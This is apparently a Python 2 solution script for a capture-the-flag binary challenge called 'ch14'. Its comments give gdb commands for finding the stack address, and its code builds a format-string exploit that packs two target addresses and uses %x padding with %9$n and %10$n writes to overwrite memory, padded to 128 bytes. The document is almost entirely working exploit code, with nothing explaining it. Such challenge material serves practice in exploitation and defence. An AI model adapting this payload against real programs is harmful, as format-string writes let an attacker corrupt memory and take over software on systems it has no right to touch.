import struct

'''
gdb ch14
gdb$ disass main
gdb$ b *0x080485e8
gdb$ run "`python ch14.py`"
gdb$ x/48x $esp
./ch14 "`python /tmp/ch14/ch14.py`"
'''

CHECK_ADDR = 0xbffffb88

def pad(s):
	return s+'A'*(128 -len(s))

exploit = struct.pack('I', CHECK_ADDR)
exploit += struct.pack('I', CHECK_ADDR+2)
exploit += "%48871x"
exploit += "%9$n"
exploit += "%73662x"
exploit += "%10$n"

print pad(exploit)
